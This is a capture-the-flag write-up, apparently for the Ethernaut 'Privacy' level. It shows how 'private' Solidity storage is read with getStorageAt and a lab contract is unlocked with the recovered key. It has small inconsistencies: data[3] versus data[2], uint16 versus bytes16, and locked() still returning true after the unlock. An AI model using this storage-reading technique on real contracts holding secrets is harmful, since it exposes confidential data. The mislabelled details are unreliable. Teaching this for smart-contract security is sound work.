# Privacy

## Key

**Access state variables**: anybody can read them even if they are declared as private.

**Data**: data for a contract is stored continuesly in terms of index based slots. Stored from right to left <-
**Constant variables**: variables declared as `constant` are not stored in the storage, we wont be able to query it. And `mappings` and `dynamically sized arrays` dont stick to this conventions.

**Bytes -> Bits**:

`1 byte` == `8 bits`

`32 bytes` == `256 bits`

`uint256` == `address` == `32 bytes` == 1 slot in mem

`bytes4` == `32 bits`

`uint8` == 8 bits unisigned

**Optimize storage** to reduce gas fees. One can archieve this switching the order of variables, there are no automatic alignement.

**Casting with explicit conversions**

```
uint32 a = 0x12345678;
uint16 b = uint16(a); // b will be 0x5678 now
```

https://docs.soliditylang.org/en/v0.8.7/types.html#explicit-conversions

**We need to query the last element of `data` to find the `_key` and cast it to uint16 accordingly**

## Solution

1. Make a mental mapping of the variables inside the storage

```
Iterate over 0...5 ->
await web3.eth.getStorageAt(contract.address, 0)
```

```
    32 bytes == 256 bits
0   0x0000000000000000000000000000000000000000000000000000000000000001
1   0x000000000000000000000000000000000000000000000000000000006238764d
2   0x00000000000000000000000000000000000000000000000000000000764dff0a
3   0xdff67d680ba59608238503ad751f026ef734af5ce8fd6b182d2d3d36f4f71764
4   0xdba04176b4ae9baa4ad22b384e2eeabb9276da5e619b28e86437bd4b8c4cf1e9
5   0xa7723754fdcd9fe3743a48bce2aaac274663fa6c4f433cb114f6afa3eda7cab1
```

```
0   0x0000000000000000000000000000000000000000000000000000000000000001
                                                         [bool] locked
1   0x000000000000000000000000000000000000000000000000000000006238764d
                                                          [uint256] ID
2   0x00000000000000000000000000000000000000000000000000000000764dff0a
    [uint16] awkwardness  | [uint8] denomination  | [uint8] flattening
             ~ now -> 7642|         ~ 0xff        |         ~ 0x0a
3   0xdff67d680ba59608238503ad751f026ef734af5ce8fd6b182d2d3d36f4f71764
    [bytes32][0] data
4   0xdba04176b4ae9baa4ad22b384e2eeabb9276da5e619b28e86437bd4b8c4cf1e9
    [bytes32][1] data
5   0xa7723754fdcd9fe3743a48bce2aaac274663fa6c4f433cb114f6afa3eda7cab1
    [bytes32][2] data
    [a7723754fdcd9fe3743a48bce2aaac27][4663fa6c4f433cb114f6afa3eda7cab1]
    [bytes16][0]                      [bytes16][1]
```

2. Find the `data[3]` first half as it is casted in `uint16`, and unlock the contract

```
> await contract.unlock("0xa7723754fdcd9fe3743a48bce2aaac27")

> await contract.locked()
true
```

## Post solution info

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius":[ How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)

**Hash info to keep secrets in the blockchain!**
